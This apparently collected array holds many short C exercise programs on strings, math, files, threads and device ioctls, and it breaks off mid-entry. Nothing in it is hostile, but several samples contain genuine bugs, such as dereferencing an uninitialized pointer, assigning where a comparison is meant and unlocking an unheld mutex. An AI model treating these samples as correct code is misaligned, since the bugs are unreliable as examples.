    "#include <stdio.h>\nint ft_strncmp(char *s1, char *s2, unsigned int n)\n{\n    unsigned int a;\n    a = 0;\n    if (n == 0)\n    {\n        return (0);\n    }\n    while ((*s1 != 0 && *s1 == *s2) && a < n - 1)\n    {\n        a++;\n        s1++;\n        s2++;\n    }\n    return (*s1 - *s2);\n}\nint main ()\n{\n    char s1[] = \"rodrigo\";\n    char s2[] = \"rodrigues\";\n    printf(\"%d\\n\", ft_strncmp(s1, s2, 7));\n}",
    "int printf(const char *, ...);\nunsigned long int iterator(unsigned long int val, unsigned long int a){\n a = (a+val/a)/2;\n if (a*a <= val) {\n  return a;\n }\n else\n {\n  return iterator(val, a);\n }\n}\nunsigned long int squareroot(unsigned long int val){\n if (val == 0){\n  return 0;\n }\n else\n {\n  return iterator(val, (1 + val) / 2);\n }\n}\nint main (){\n printf(\"Wurzel aus %lu ist %lu\\n\",(unsigned long)12345, squareroot((unsigned long)12345));\n printf(\"Wurzel aus %lu ist %lu\\n\",(unsigned long)81, squareroot((unsigned long)81));\n printf(\"Wurzel aus %lu ist %lu\\n\",(unsigned long)0, squareroot((unsigned long)0));\n printf(\"Wurzel aus %lu ist %lu\\n\",(unsigned long)9999, squareroot((unsigned long)9999));\n printf(\"Wurzel aus %lu ist %lu\\n\",(unsigned long)9, squareroot((unsigned long)9));\n printf(\"Wurzel aus %lu ist %lu\\n\",(unsigned long)1, squareroot((unsigned long)1));\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nconst void* mymax(\n const void *base, size_t nmemb, size_t size,\n int (*compar)(const void *, const void *)) {\n const unsigned long *max = base;\n for (size_t i = 1, offset = size; i < nmemb; ++i, offset += size) {\n  const unsigned long *temp = base + offset;\n  if (compar(temp, max) == 1) {\n   max = temp;\n  }\n }\n return max;\n}\nint gt_int(const void *a, const void *b) {\n return *(int*)a > *(int*)b ? 1 : 0;\n}\nint gt_char(const void *c1, const void *c2) {\n return *(char*)c1 > *(char*)c2 ? 1 : 0;\n}\nint gt_str(const void *s1, const void *s2) {\n return strcmp(*(char**)s1, *(char**)s2) > 0 ? 1 : 0;\n}\nint main() {\n int arr_int[] = {1, 3, 5, 7, 4, 6, 9, 2, 0};\n for (int i = 0; i < 9; ++i) {\n  if (i == 0) printf(\"Max (\");\n  printf(\"%d\", arr_int[i]);\n  if (i != 8) printf(\", \");\n  else printf(\") = %d\\n\", *(int*)mymax(arr_int, 9, sizeof(int), gt_int));\n }\n char arr_char[] = \"Suncana strana ulice\";\n for (int i = 0; i < 20; ++i) {\n  if (i == 0) printf(\"Max (\");\n  printf(\"%c\", arr_char[i]);\n  if (i != 19) printf(\", \");\n  else printf(\") = %c\\n\", *(char*)mymax(arr_char, 20, sizeof(char), gt_char));\n }\n const char* arr_str[] = {\n     \"Gle\", \"malu\", \"vocku\", \"poslije\", \"kise\",\n     \"Puna\", \"je\", \"kapi\", \"pa\", \"ih\", \"njise\"\n };\n for (int i = 0; i < 11; ++i) {\n  if (i == 0) printf(\"Max (\");\n  printf(\"%s\", arr_str[i]);\n  if (i != 10) printf(\", \");\n  else printf(\") = %s\\n\", *(char**)mymax(arr_str, 11, sizeof(char*), gt_str));\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nvoid armstrong(int b, int c);\nint main() {\n    int b = 0;\n    int c = 0;\n    printf(\"b: \"); scanf(\"%d\", &b);\n    printf(\"c: \"); scanf(\"%d\", &c);\n    if (b > c) {\n        printf(\"Requirement: b <= c\\n\");\n        return 0;\n    }\n    armstrong(b, c);\n}\nvoid armstrong(int b, int c) {\n    int n = b;\n    int digits;\n    int nth;\n    int sum;\n    int i;\n    for (;n <= c; ++n) {\n        digits = ceil(log10(n));\n        sum = 0;\n        for (i = 0; i <= digits; ++i) {\n            nth = (int)(n / pow(10, i)) % 10;\n            sum += pow(nth, digits);\n        }\n        if (sum == n) {\n            printf(\"%d\\n\", n);\n        }\n    }\n}",
    "#include <stdio.h>\nint main() {\n    float *ptr_float;\n    printf(\"El valor apuntado por ptr_float es %f\", *ptr_float);\n    *ptr_float = 10.5;\n    return 0;\n}",
    "#include <stdio.h>\nint n=0;\nfloat x=0, med=0, max=0, min=0, mid=0;\nint main(){\n printf(\"ingrese un valor abritrario de altura: \");\n scanf(\"%f\",&x);\n max=x;\n min=x;\n while (x>=0){\n  n++;\n  med=med+x;\n  if (x>max){\n  max=x;\n  }\n  if (x<min){\n  min=x;\n  }\n  printf(\"ingrese un valor arbitrario de altura: \");\n  scanf(\"%f\",&x);\n }\n mid=med/n;\n if (n=0){\n  printf(\"no es un numero  positivo\");\n }\n  else{\n   printf(\"media: %.3f, maxima: %.3f, minimo: %.3f \\n\", mid,max,min);\n  }\n return 0;\n }",
    "#include <stdio.h>\n#include<stdlib.h>\nint main()\n{\n FILE *fptr,*fptr1;\n char ch;\n    fptr=fopen(\"Mythpat.txt\",\"r\");\n    fptr1=fopen(\"Destination.txt\",\"w\");\n    if(fptr==((void*)0))\n    {\n     printf(\"File Cannot be opened or Created\");\n     exit(1);\n    }\n    while((ch=getc(fptr))!=(-1))\n     fputc(ch,fptr1);\n    fclose(fptr);\n    fclose(fptr1);\n return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\nint main() {\n    int a = 10, b = 15;\n    printf(\"a, b = %d, %d\\n\", a, b);\n    a ^= b;\n    b ^= a;\n    a ^= b;\n    printf(\"after swap a, b = %d, %d\\n\", a, b);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\nint main(int argc, char **argv)\n{\n int led_fd;\n char get_number;\n if(argc != 2) {\n  printf(\"Usage : [Number]\\n\");\n  return -1;\n }\n led_fd = open(\"/dev/kernel_timer\", (0x10000000));\n if (led_fd<0){\n  printf(\"Open Failured!\\n\");\n  return -1;\n }\n get_number=atoi(argv[1]);\n printf(\"get %d\\n\",get_number);\n write(led_fd, &get_number, sizeof(get_number) );\n close(led_fd);\n return 0;\n}",
    "#include <stdio.h>\nlong long pailie(int a,int b)\n{\n int i;\n long long int sum=1;\n if(b<a-b)\n  b=a-b;\n for(i=b+1;i<=a;i++)\n  sum*=i;\n for(i=1;i<=a-b;i++)\n  sum/=i;\n return sum;\n}\nint main()\n{\n long long c;\n int a,b;\n scanf(\"%d%d\",&a,&b);\n c=pailie(a,b);\n printf(\"%lld\",c);\n return 0;\n}",
    "#include <stdio.h>\nunion Endian{\n    int a;\n    char ch[4];\n} ed;\nint main()\n{\n    ed.a = 0x01234567;\n    printf(\"%p\\n%p\\t%p\\n\", &ed.a, &ed.ch[0], &ed.ch[1]);\n    printf(\"%x\", ed.ch[0]);\n    return 0;\n}",
    "#include <assert.h>\n#include <stdio.h>\nint hamming_distance(char* str1, char* str2)\n{\n    int i = 0, distance = 0;\n    while (str1[i] != '\\0')\n    {\n        if (str1[i] != str2[i])\n        {\n            distance++;\n        }\n        i++;\n    }\n    return distance;\n}\nstatic void test()\n{\n    char str1[] = \"karolin\";\n    char str2[] = \"kathrin\";\n    assert(hamming_distance(str1, str2) == 3);\n    char str3[] = \"00000\";\n    char str4[] = \"11111\";\n    assert(hamming_distance(str3, str4) == 5);\n    printf(\"All tests have successfully passed!\\n\");\n}\nint main()\n{\n    test();\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n char c;\n FILE * fp=fopen(\"Source1.txt\",\"r\");\n if(fp==((void*)0))\n  printf(\"Error opening Source1.\\n\");\n else\n {\n  while((c=fgetc(fp))!=(-1))\n   printf(\"%c\",c);\n }\n fclose(fp);\n return 0;\n}",
    "#include <stdio.h>\nsigned char c;\nsigned short s;\nsigned int i;\nsigned long int l;\nunsigned char C;\nunsigned short S;\nunsigned int I;\nunsigned long int L;\nfloat f;\ndouble d;\nlong double D;\nvoid *p;\nvoid (*P)(void);\nvoid print(void) {\n printf(\"%d %d %d %d %u %u %u %u\\n\",c,s,i,l,C,S,I,L);\n}\nint main() {\n c= 1; s=c;i=c;l=c;C=c;S=c;I=c;L=c;f=c;d=c;D=c; print();\n s= 2; c=s; i=s;l=s;C=s;S=s;I=s;L=s;f=s;d=s;D=s; print();\n i= 3; c=i;s=i; l=i;C=i;S=i;I=i;L=i;f=i;d=i;D=i; print();\n l= 4; c=l;s=l;i=l; C=l;S=l;I=l;L=l;f=l;d=l;D=l; print();\n C= 5; c=C;s=C;i=C;l=C; S=C;I=C;L=C;f=C;d=C;D=C; print();\n S= 6; c=S;s=S;i=S;l=S;C=S; I=S;L=S;f=S;d=S;D=S; print();\n I= 7; c=I;s=I;i=I;l=I;C=I;S=I; L=I;f=I;d=I;D=I; print();\n L= 8; c=L;s=L;i=L;l=L;C=L;S=L;I=S; f=L;d=L;D=L; print();\n f= 9; c=f;s=f;i=f;l=f;C=f;S=f;I=f;L=f; d=f;D=f; print();\n d=10; c=d;s=d;i=d;l=d;C=d;S=d;I=d;L=d;f=d; D=d; print();\n D=11; c=D;s=D;i=D;l=D;C=D;S=D;I=D;L=D;f=D;d=D; print();\n p=0; p=0L; p=0U; p=0UL; p=P;\n P=0; P=0L; P=0U; P=0UL; P=p;\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint smallest_word_index(char *s[], int n) {\n int res = 0;\n for (int i = 1; i < n; i++) {\n  if (strcmp(s[i], s[res]) < 0)\n   res = i;\n }\n return res;\n}\nchar **smallest_word_address(char *s[], int n) {\n return &s[smallest_word_index(s, n)];\n}\nint main(int argc, char *argv[]) {\n printf(\"via index: %s\\n\", argv[smallest_word_index(argv + 1, argc - 1) + 1]);\n printf(\"via address: %s\\n\", *smallest_word_address(argv + 1, argc - 1));\n return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int count, n, c, index;\n    index = count = 0;\n    printf(\"Tab size?\\n\");\n    scanf(\"%d\", &n);\n    getchar();\n    printf(\"Set tab size: %d\\n\", n);\n    while ((c = getchar()) != (-1)) {\n        if (c == '\\t') {\n            count = n - (index % n);\n            while (count--) {\n                ++index;\n                putchar(' ');\n            }\n        } else {\n            putchar(c);\n            (c == '\\n') ? (index = 0) : ++index;\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\nint main()\n{\n    long a = 2;\n    long ini = 0;\n    long ran_char = pow(a,8);\n    short int ran_shint = pow(a, 16);\n    unsigned long int ran1_lnint = pow(a, 32);\n    long int ran_lnint = pow(a, 32);\n    printf(\"Unsigned Char: %d a %d\\n\", ini, ran_char - 1);\n    printf(\"Signed Char: %d a %d\\n\", 0-(ran_char/2), ran_char/2 - 1);\n    printf(\"Unsigned Short Int: %d a %hi\\n\", ini, ran_shint - 1);\n    printf(\"Signed Short Int: %hi a %hi\\n\", 0-(ran_shint/2), ran_shint/2 - 1);\n    printf(\"Unsigned Long Int: %d a %lu\\n\", ini, ran1_lnint - 1);\n    printf(\"Signed Long Int: %li a %li\\n\", (0-(ran_lnint/2))*-1, (ran_lnint/2 - 1)*-1);\n    return 0;\n}",
    "#include <stdio.h>\n#include <pthread.h>\n\nint num;\npthread_mutex_t m;\npthread_cond_t empty, full;\nvoid *thread1(void *arg)\n{\n  while(num > 0)\n  {\n    pthread_cond_wait(&empty, &m);\n  }\n  num++;\n  printf(\"producing ....\\n\");\n  pthread_mutex_unlock(&m);\n  pthread_cond_signal(&full);\n}\nvoid *thread2(void *arg)\n{\n  pthread_mutex_lock(&m);\n  while(num == 0)\n  {\n    pthread_cond_wait(&full, &m);\n  }\n  num--;\n  printf(\"consume ....\\n\");\n  pthread_mutex_unlock(&m);\n  pthread_cond_signal(&empty);\n}\nint main()\n{\n  pthread_t t1, t2;\n  num = 2;\n  pthread_mutex_init(&m, 0);\n  pthread_cond_init(&empty, 0);\n  pthread_cond_init(&full, 0);\n  pthread_create(&t1, 0, thread1, 0);\n  pthread_create(&t2, 0, thread2, 0);\n  pthread_join(t1, 0);\n  pthread_join(t2, 0);\n  return 0;\n}",
    "#include <stdio.h>\n#include <dirent.h>\nint main(int argc, char *argv[]) {\n  if ( opendir(\"/tmp\") ) {\n    printf(\"dir exists\");\n  } else {\n    printf(\"dir does not exist\");\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint arraycmp(const void * n1, const void * n2)\n{\n return *(int *)n2 - *(int *)n1;\n}\nint main()\n{\n int n, c[3],i;\n scanf(\"%d\", &n);\n if (n < 100 || n > 999)\n {\n  printf(\"error in range\\n\");\n  return -1;\n }\n for (i = 0; i < 3; n/=10,i++)\n {\n  c[i] = n%10;\n }\n qsort(c,3,sizeof(int),arraycmp);\n i = c[0]*100 + c[1] *10 + c[2];\n printf(\"%d \\n\", i);\n return 0;\n}",
    "#include <stdio.h>\n\n\n\nint main()\n{\n        printf(\"%s\\n\", \"12\");\n        printf(\"%s\\n\", \"f(1,2)\");\n        return 0;\n}",
    "#include <stdio.h>\n\nvoid init_ident_array(int *a, int dimension);\nvoid print_int_array(const int a[], int n);\nvoid print_ident_array(const int *a, int n);\nint main() {\n    int ident[10][10], *ptr, zeros = 0, ident2[10][10];\n    for (ptr = &ident[0][0]; ptr <= &ident[10 -1][10 -1]; ptr++) {\n        if ((ptr == &ident[0][0]) || zeros == 10) {\n            *ptr = 1;\n            zeros = 0;\n        } else {\n            *ptr = 0;\n            zeros++;\n        }\n    }\n    for (int i = 0; i < 10; i++)\n        print_ident_array(ident[i], 10);\n    init_ident_array(ident2[0], 10);\n    for (int i = 0; i < 10; i++)\n        print_ident_array(ident2[i], 10);\n}\nvoid init_ident_array(int *a, int dimension) {\n    int n = dimension * dimension;\n    while (n--)\n        *a++ = !(n % (dimension + 1));\n}\nvoid print_int_array(const int a[], int n) {\n    while (n--)\n        printf(\"%d\", *a++);\n    puts(\"\");\n}\nvoid print_ident_array(const int *a, int n) {\n    while (n--) {\n        printf(\"%d\", *a++);\n        if (!n % 10)\n            puts(\"\");\n    }\n}",
    "#include <stdio.h>\nint main(){\n    printf(\"The number of eggs for the day:\");\n    int eggs;\n    scanf(\"%i\", &eggs);\n    double dozen = (double) eggs / 12;\n    printf(\"You have %f dozen eggs.\\n\", dozen);\n    return 0;\n}",
    "int main(){\nint x,y,z;\nx=12;\ny=x+22;\nz=y+32;\n}",
    "#include <stdio.h>\nint main() {\n int num1,num,cont;\n  cont=0;\n    for(num1=1;num1<=5;num1++){\n        scanf(\"%d\",&num);\n        if(num%2==0)\n            cont++;\n    }\n    printf(\"%d valores pares\\n\",cont);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdbool.h>\nint main(){\n int class=3;\n float this=4.5;\n double d=55.4;\n char c=c;\n short s=99;\n long l =255555;\n char str[]=\"hhh\u00e7\";\n _Bool b=1;\n printf(str);\n}",
    "#include <stdio.h>\nint main ()\n{\n char letra;\n letra = getchar ();\n letra = letra >= 'a' && letra <= 'z' ? letra - 32 : letra;\n putchar(letra);\n return 0;\n}",
    "#include<stdio.h>\nint main( void )\n{\n  int n, triangularNumber;\n  triangularNumber = 0;\n  for( n = 1; n <= 200; n = n + 1 )\n    triangularNumber = triangularNumber + n;\n  printf( \"%-2i         %i\\n\", n, triangularNumber );\n  return 0;\n}",
    "#include <stdio.h>\n\nint main(void) {\n    double a = 0.0;\n    double b = 0.0;\n    double c = 0.0;\n    double pa = 2.0;\n    double pb = 3.0;\n    double pc = 5.0;\n    double media = 0.0;\n    scanf(\"%lf\", &a);\n    scanf(\"%lf\", &b);\n    scanf(\"%lf\", &c);\n    media = ((a * pa) + (b * pb) + (c * pc))/(pa + pb + pc);\n    printf(\"MEDIA = %.1lf\\n\", media);\n    return 0;\n}",
    "#include <stdio.h>\n#include <malloc.h>\n#include <math.h>\nint main()\n{\n    int Nx=10001;\n    int Nt=1200;\n    int i,j;\n    FILE *fin,*fou;\n    float *x;\n    float p;\n    x =(float *)malloc(sizeof(float )*Nt );\n    fin=fopen(\"vp2d.dat\",\"rb\");\n    if(fin==((void*)0))\n    {\n        printf(\"err=1\\n\");\n    }\n    fou=fopen(\"topo2d.dat\",\"wb\");\n    if(fou==((void*)0))\n    {\n        printf(\"err=2\\n\");\n    }\n    for(i=0;i<Nx;i++)\n    {\n        fread(x,4,Nt,fin);\n        for(j=0;j<Nt;j++)\n        {\n            if(fabs(x[j]-x[j-1])>100)\n            {\n                p=5.0*(j);\n                if(i==10000)\n                    printf(\"%f\\n\",p);\n                break;\n            }\n        }\n        fwrite(&p,1,4,fou);\n    }\n    free(x);\n    fclose(fin);\n    fclose(fou);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n float weight;\n float value;\n printf(\"Are you worth your weight in rhodium?\\n\");\n printf(\"Let's check it out.\\n\");\n printf(\"Please enter your weight in pounds:\");\n scanf(\"%f\", &weight);\n value = 770*14.5833*weight;\n printf(\"%.4f\\n\", value);\n return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n long prev = 1;\n long curr = 2;\n long tmp = 0;\n long sum = 0;\n while (curr < 4000000)\n {\n  if (!(curr % 2))\n   sum += curr;\n  tmp = curr + prev;\n  prev = curr;\n  curr = tmp;\n }\n printf(\"%ld\\n\", sum);\n return (0);\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<math.h>\nint main(){\n    system(\"cls\");\n    float a,b,c;\n    printf(\"A: \");\n    scanf(\"%f\",&a);\n    printf(\"B: \");\n    scanf(\"%f\",&b);\n    printf(\"C: \");\n    scanf(\"%f\",&c);\n    float r = pow(a+b,2);\n    float s = pow(b+c,2);\n    float d = (r+s)/2;\n    printf(\"\\nResultado: %.2f\",d);\n    return 0;\n}",
    "#include <stdio.h>\nint resultadoResta = 0;\nint sumar(int n1, int n2){\n return n1 + n2;\n}\nint restar(int numero1, int numero2){\n resultadoResta = numero1 - numero2;\n printf(\"\\nResultado RESTA desde dentro de la funci\u00f3n %d\", resultadoResta);\n return resultadoResta;\n}\nint main(void){\n int suma = sumar(20, 230);\n printf(\"La suma es: %d\\n \", suma);\n int resta = restar(100, 50);\n printf(\"\\nResultado RESTA desde fuera de la funci\u00f3n: %d\\n \", resta);\n printf(\"\\nVariable resutadoResta: %d\\n \", resultadoResta);\n int resultadoFinal = suma - resta;\n printf(\"\\nBalance final suma - resta = %d\", resultadoFinal);\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n fprintf((stdout), \"please input the value a:\\n\");\n int a;\n fscanf((stdin),\"%d\", &a);\n if(a<0) {\n  fprintf((stderr), \"the value must > 0\\n\");\n  return 1;\n }\n return 0;\n}",
    "#include <stdio.h>\n\ntypedef long long lli;\nlli hp, att, ehp, eatt;\nlli chp[100001], catt[121];\nint f(int buf, int c) {\n lli h = chp[c] - 3 * eatt*buf;\n lli a = catt[buf];\n if (h <= 0) return (1<<29);\n lli hh = ehp - eatt*c;\n if (hh <= 0) return buf + c;\n lli need = ((hh + a - 1) / a - 1);\n if (need*eatt >= h) return (1<<29);\n return need + 1 + buf + c;\n}\nint main() {\n scanf(\"%lld %lld %lld %lld\", &hp, &att, &ehp, &eatt);\n chp[0] = hp; catt[0] = att;\n for (int i = 1; i <= 120; i++) {\n  catt[i] = catt[i - 1] + catt[i - 1] / 5;\n  if (catt[i] >= (1<<29)) catt[i] = (1<<29);\n }\n for (int i = 1; i <= 100000; i++) {\n  chp[i] = chp[i - 1] + chp[i - 1] / 10;\n  if (chp[i] >= (1<<29)) chp[i] = (1<<29);\n }\n int res = (1 << 29);\n    int c_c , b_c, a_c;\n for (int i = 0; i <= 120; i++) {\n  for (int j = 0; j <= 100000; j++) {\n   int w = f(i, j);\n   if (w < res) {\n                b_c = i ;\n                c_c = j;\n                a_c = w - i - j;\n                res = w;\n            }\n  }\n }\n printf(\"%d : B : %d C : %d A : %d\\n\", res, b_c, c_c, a_c);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(int ragc, char** argv){\n int angle = atoi(argv[1]);\n int pangle = 0.0f;\n  pangle = angle+180;\n printf(\"C [-180 - 180] = %d ==> Cp [0 - 360] = %d\\n\", angle, pangle);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <errno.h>\n#include <string.h>\n#include <sys/file.h>\n#include <sys/ioctl.h>\nint main(int argc , char *argv[])\n{\n int fd;\n int ret = 0;\n int para = 0;\n fd = open(\"/dev/pinmem\",((0x04000000) | (0x10000000)));\n if (fd <= 0) {\n  printf(\"Open file:%s fail.\\n\", \"/dev/pinmem\");\n  return -1;\n }\n if (argc < 1 + 1) {\n  close(fd);\n  return -(28);\n }\n if (!strcmp(argv[1], \"--finish-pin\")) {\n  ret = ioctl(fd, _IOW(0x59, 4, int), &para);\n  if (ret < 0) {\n   printf(\"Finish pin fail, errno: %s\\n\", strerror(errno));\n  }\n } else if (!strcmp(argv[1], \"--clear-pin-mem\")) {\n  ret = ioctl(fd, _IOW(0x59, 2, int), &para);\n  if (ret < 0) {\n   printf(\"Clear pin mem fail, errno: %s\\n\", strerror(errno));\n  }\n } else if (!strcmp(argv[1], \"--init-pagemap-read\")) {\n  ret = ioctl(fd, _IOW(0x59, 5, int), &para);\n  if (ret < 0) {\n   printf(\"Init pagemap read fail, errno: %s\\n\", strerror(errno));\n  }\n }\n close(fd);\n return ret;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include<time.h>\nint main()\n{\n system(\"color f0\");\n  int i,password,len,b;\n  srand((unsigned int)time(((void*)0)));\n   printf(\"\\n\\n\\t\\t\\t Enter No. of Password you want !!!\\n\\n\\t\\t\\t\\t\\t\");\n  scanf(\"%d\",&b);\n  printf(\"\\n\\n\\n\\t\\tEnter Password Length and must be greater than \\\"5\\\"\\n\\n\\t\\t\\t\\t\\t\");\n  scanf(\"%d\",&len);\n  printf(\"\\n\\n\\t\\t\\t\\t\");\n  if(len>=6)\n  {\n   system(\"cls\");\n   printf(\"\\n\\n\\t\\t\\t\\tPASSWORDS ARE GIVEN BELOW !!!\\n\\n\\t\\t\\t\\t\");\n   while(b--)\n   {\n     for(i=0;i<len;i++)\n      {\n      int k=rand()%200;\n       if((k>=48&&k<=57)||(k>=65&&k<=90)||(k>=97&&k<=122)||(k>=35&&k<=37)||k==64)\n       {\n        printf(\"%c\",k);\n        }\n        else\n        {\n         i--;\n        }\n      }\n      printf(\"\\n\\n\\t\\t\\t\\t\");\n  }\n}\n  else\n  {\n   printf(\"\\n\\n\\n\\t\\t\\tLength should be greater than \\\"6\\\"\\n\");\n  }\n  system(\"pause\");\n}",
    "#include <stdio.h>\nint main()\n{\n  double a, b, c, d;\n  double fracn, fracd, sumn, sumd;\n  sumn = sumd = 1;\n  for(a = 1; a < 10; a++){\n    for(b = 1; b < 10; b++){\n      for(c = 1; c < (a + 1); c++){\n for(d = 1; d < 10; d++){\n   fracd = (a*10) + b;\n   fracn = (c*10) + d;\n   if(fracd <= fracn)\n     break;\n   if(a == c)\n     if(fracn/fracd == d/b){\n       sumn *= b;\n       sumd *= d;\n     }\n   if(a == d)\n     if(fracn/fracd == c/b){\n       sumn *= b;\n       sumd *= c;\n     }\n   if(b == c)\n     if(fracn/fracd == d/a){\n       sumn *= a;\n       sumd *= d;\n     }\n   if(b == d)\n     if(fracn/fracd == c/a){\n       sumn *= a;\n       sumd *= c;\n     }\n }\n      }\n    }\n  }\n  printf(\"%d / %d\\n\", (int)sumd, (int)sumn);\n  return 0;\n}",
    "#include <stdio.h>\nint main(){\n printf(\"Dennis Ritchie is a \\\"big wet\\\"\\n\");\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n  int i = 1, num, maior = 0, posicao;\n  while (i <= 100) {\n    scanf(\"%d\", &num);\n    if (num > maior) {\n      maior = num;\n      posicao = i;\n    }\n    i++;\n  }\n  printf(\"%d\\n\", maior);\n  printf(\"%d\\n\", posicao);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main() {\n    float av1, av2, av3, media;\n    printf(\"Nota 1: \");\n    scanf(\"%f\", &av1);\n    printf(\"Nota 2: \");\n    scanf(\"%f\", &av2);\n    printf(\"Nota 3: \");\n    scanf(\"%f\", &av3);\n    media = (av1 + av2 + av3) / 3;\n    printf(\"| Nota 1: %0.1f\\t| Nota 2: %0.1f\\t| Nota 3: %0.1f |\\n\", av1, av2, av3);\n    printf(\"\\n| Media: %0.1f\\t| Situacao: %s |\\n\\n\", media, ((6<=media)?\"Aprovado\":\"Reprovado\"));\n    system(\"pause\");\n    return 0;\n}",
    "#include <stdio.h>\n\n\n\nint main() {\n    int i, j, a[3][3], sum = 0;\n    for (i = 0; i < 3; i++) {\n        printf(\"\u8bf7\u8f93\u5165\u7b2c%d\u884c\u77e9\u9635\uff0c\u6570\u636e\u7a7a\u683c\u5206\u5f00\uff1a\", i + 1);\n        for (j = 0; j < 3; j++) {\n            scanf(\"%d\", &a[i][j]);\n        }\n    }\n    for (i = 0; i < 3; i++) {\n        if (0 == 3 % 2) {\n            sum += a[i][i] + a[i][3 - 1 - i];\n        } else {\n            if (i == (3 - 1) / 2) {\n                sum += a[i][i];\n            } else {\n                sum += a[i][i] + a[i][3 - 1 - i];\n            }\n        }\n    }\n    printf(\"\u4e24\u5bf9\u89d2\u7ebf\u4e4b\u548c\u4e3a\uff1a%d\\n\", sum);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid square( float* x);\nint main()\n{\n    float num;\n    printf(\"Enter a number to be squared:\\n\");\n    scanf(\"%f\", &num);\n    square(&num);\n    printf(\"Square of the number is : %.2f\", num);\n    return 0;\n}\nvoid square( float* x)\n{\n    *x = (*x)*(*x);}",
    "#include<stdio.h>\nint main(){\n    double salary =0,percent = 0,newSalary = 0,increace = 0;\n    scanf(\"%lf\",&salary);\n    if(salary>=0 && salary<=400){\n        percent = 15;\n    }\n    else if(salary>400.00 && salary<=800){\n        percent = 12;\n    }\n    else if(salary>800.00 && salary<=1200 ){\n        percent = 10;\n    }\n    else if(salary>1200.00 && salary<=2000){\n        percent = 7;\n    }\n    else{\n        percent = 4;\n    }\n    increace = salary * (percent/100);\n    newSalary = salary + increace;\n    printf(\"Novo salario: %.2lf\\n\",newSalary);\n    printf(\"Reajuste ganho: %.2lf\\n\",increace);\n    printf(\"Em percentual: %d %%\\n\",(int)percent);\n    return 0;\n}",
    "#include <stdio.h>\n#include<math.h>\nint main(void) {\n  double X, Y, Xd , Yd, A;\n  scanf(\"%lf %lf\\n\"\"%lf %lf\", &X, &Y, &Xd, &Yd);\n  A = sqrt(((X-Xd)*(X-Xd))+((Y-Yd)*(Y-Yd)));\n  printf(\"%.4lf\\n\", A);\n  return 0;\n}",
    "#include <stdio.h>\nvoid combina_array(int *X, int dim_X, int *Y, int dim_Y, int *Ord) {\n   if (dim_X == 0) {\n       if (dim_Y == 0) {\n           return;\n       }\n       else {\n           *Ord = *Y;\n           return combina_array(X, 0, Y+1, dim_Y-1, Ord+1);\n       }\n    }\n    else if (dim_Y == 0) {\n        *Ord= *X;\n        return combina_array(X+1, dim_X-1, Y, 0, Ord+1);\n    }\n    else if (*X <= *Y) {\n        *Ord= *X;\n        return combina_array(X+1, dim_X-1, Y, dim_Y, Ord+1);\n    }\n    else {\n        *Ord= *Y;\n        return combina_array(X, dim_X, Y+1, dim_Y-1, Ord+1);\n    }\n}\nint main(void) {\n    int X[3] = {3,6,8};\n    int Y[4] = {4,5,7,9};\n    int Z[7];\n    combina_array(&X[0], 3, &Y[0], 4, &Z[0]);\n    for(int i=0; i<7; i+=1) {\n        printf(\" %d\", Z[i]);\n    }\n    printf(\"\\n\");\n}",
    "#include <stdio.h>\nint main()\n{\n    int n = 0;\n    int sum = 0;\n    int i = 1;\n    int j = 2;\n    int temp;\n    scanf(\"%d\", &n);\n    while (j <= n)\n    {\n        if ((j & 1) == 0)\n            sum += j;\n        temp = i;\n        i = j;\n        j = temp + i;\n    }\n    printf(\"%d\\n\", sum);\n    return 0;\n}",
    "int main (void) {\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nint sum_two_dimensional_array(const int a[], int n);\nint main(void)\n{\n    int array_2D[10][10] = {1, 2, 3, 4, 5};\n    int *p = &array_2D[0][0];\n    printf(\"The sum is %d.\\n\", sum_two_dimensional_array(p, 10));\n    return 0;\n}\nint sum_two_dimensional_array(const int a[], int n)\n{\n    const int *p;\n    int sum = 0;\n    for (p = a; p < a + n * 10; p++)\n    {\n        sum += *p;\n    }\n    return sum;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n\n\nint main() {\n  int errors;\n  int i, j;\n  char cmd1[1000];\n  char cmd2[1000];\n  const int inputs[3][10] = {\n    { 0, 1, 2, 3, 4, 5, 6, 8, 10, 11 },\n    { 0, 1, 2, 3, 4, 5, 10, 100, 1000, 10000 },\n    { 0, 1, 2, 3, 4, 5, 10, 100, 1000, 10000 }\n  };\n  const char files[3][100] = {\n    \"test/automated-test/test-cvmp/test1.cvmp\",\n    \"test/automated-test/test-cvmp/test2.cvmp\",\n    \"test/automated-test/test-cvmp/test3.cvmp\",\n  };\n  const char outputs[3][10][100] = {\n    {\n      \"REG [30]:\\t1\",\n      \"REG [30]:\\t1\",\n      \"REG [30]:\\t2\",\n      \"REG [30]:\\t6\",\n      \"REG [30]:\\t24\",\n      \"REG [30]:\\t120\",\n      \"REG [30]:\\t720\",\n      \"REG [30]:\\t40320\",\n      \"REG [30]:\\t3628800\",\n      \"REG [30]:\\t39916800\"\n    },\n    {\n      \"REG [30]:\\t0\",\n      \"REG [30]:\\t1\",\n      \"REG [30]:\\t3\",\n      \"REG [30]:\\t6\",\n      \"REG [30]:\\t10\",\n      \"REG [30]:\\t15\",\n      \"REG 